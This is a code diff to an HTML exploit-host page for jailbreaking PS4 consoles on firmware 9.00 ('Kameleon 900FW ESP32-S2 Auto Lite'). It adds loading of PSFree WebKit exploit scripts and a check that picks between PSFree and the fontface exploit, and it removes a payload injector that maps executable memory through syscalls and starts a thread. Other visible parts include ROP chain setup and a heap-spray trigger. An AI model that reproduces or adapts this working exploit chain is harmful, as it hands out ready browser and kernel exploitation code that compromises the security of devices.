@@ -51,6 +51,15 @@ color:white;font-size:20px;text-align:center;margin:0;overflow:hidden;}
 .info{overflow: hidden;position: fixed;position: absolute;top: 45%;left: 50%;font-size: 25px;font-family: sans-serif;color: white;transform: translate(-50%, -50%);}
 
 </style>
+<script defer src="utils.js"></script>
+<script defer src="constants.js"></script>
+<script defer src="int64_psfree.js"></script>
+<script defer src="mem.js"></script>
+<script defer src="memtools.js"></script>
+<script defer src="rw.js"></script>
+<script defer src="webkit_psfree.js"></script>
+
+
     
 <script>
     // original exploit: https://github.com/ChendoChap/pOOBs4
@@ -150,30 +159,6 @@ function enableUSB() {
   getpl.open("POST", "./usbon", true);
   getpl.send(null);
 }
-
-
-function injectPayload() //dynamic payload inject - stooged
-{
-    if (payloadData.length > 0)
-    {
-       var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
-       var bufLen = payloadData.length;
-       var payload_loader = p.malloc32(bufLen);
-       var loader_writer = payload_loader.backing;
-       for(var i=0;i<bufLen/4;i++){
-            var hxVal = payloadData.slice(i*4,4+(i*4)).split("").reverse().join("").split("").map(function(s){return("0000" + s.charCodeAt(0).toString(16)).slice(-2);}).join("");
-            loader_writer[i] = parseInt(hxVal, 16);
-       }
-       chain.syscall(74, payload_loader, bufLen, (0x1 | 0x2 | 0x4));
-       var pthread = p.malloc(0x10);
-       chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_loader, payload_buffer);
-    }
-  else
-  {
-       alert("No Payload Data!");
-  }
-}
-
 
 function sleep(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
@@ -542,7 +527,7 @@ loadPayloadData();
 </script>
 </head>
 
-<body onload="setTimeout(poc, 1500);">
+<body onload="checkIfNeedsLoadingPsFree();">
     <h1 id=msgs style='font-size:25px;text-align:center;color:white'>Kameleon 900FW ESP32-S2 Auto Lite</h1>
     <div id="progress" class="info" > Loading Menu...</div>
     <div id=mymenu style="text-align:center;display:none;">
@@ -625,31 +610,32 @@ loadPayloadData();
      if (localStorage.failCounter == null || localStorage.failCounter == undefined ){
       failCounter.innerHTML=localStorage.failcount;}
     </script>
-
-<script> //Organize the payloads menu Method By NazkyYT Modded By Kameleon
-    var GBl = document.getElementById("Backl");
-    var plmenu = document.getElementById("pldmenu");
-    var linuxl = document.getElementById("linuxl");
-    var linuxlJ = document.getElementById("linuxlJ");
-
-      linuxl.onclick = function() 
-      {
-      plmenu.style.display = "none";
-      linuxl.style.display = "none";
-      linuxlJ.style.display = "unset";
-      GBl.style.display = "unset";
+    
+    <script> //Organize more the payloads menu Method By NazkyYT Modded By KameleonReloaded
+      var GBl = document.getElementById("Backl");
+      var plmenu = document.getElementById("pldmenu");
+      var linuxl = document.getElementById("linuxl");
+      var linuxlJ = document.getElementById("linuxlJ");
+    
+      linuxl.onclick = function() {
+        plmenu.style.display = "none";
+        linuxl.style.display = "none";
+        linuxlJ.style.display = "unset";
+        GBl.style.display = "unset";
+        
       }
-
-    GBl.onclick = function() {
-      plmenu.style.display = "unset";
-      linuxl.style.display = "unset"
-      linuxlJ.style.display = "none";
-      GBl.style.display = "none";
-    }
+      GBl.onclick = function() {
+        plmenu.style.display = "unset";
+        linuxl.style.display = "unset"
+        linuxlJ.style.display = "none";
+        GBl.style.display = "none";
+      }
+      
     </script>
-<script>
 
-function int64(low, hi) {
+
+<script>
+  function int64(low, hi) {
     this.low = (low >>> 0);
     this.hi = (hi >>> 0);
 
@@ -747,6 +733,7 @@ function zeroFill(number, width) {
     return number + ""; // always return a string
 }
 </script>
+
 <script>
 const stack_sz = 0x40000;
 const reserve_upper_stack = 0x10000;
@@ -933,6 +920,7 @@ window.rop = function () {
     return this;
 };
 </script>
+
 <script>
 var chain;
 var kchain;
@@ -1566,6 +1554,24 @@ var trigger_spray = function () {
             p.write8(0, 0);
         }
     });
+}
+</script>
+
+<script>
+    async function checkIfNeedsLoadingPsFree() {
+  try {
+    let response = await fetch('psfree.txt', { method: 'GET' });
+    if (response.ok) {
+        console.log("found psfree txt... running psfree...")
+      run_psfree();
+    } else {
+        console.log("not found psfree txt... running fontface...")
+      setTimeout(poc, 1500);
+    }
+  } catch (error) {
+    console.error('Error checking file:', error);
+    setTimeout(poc, 1500);
+  }
 }
 </script>
 <script>
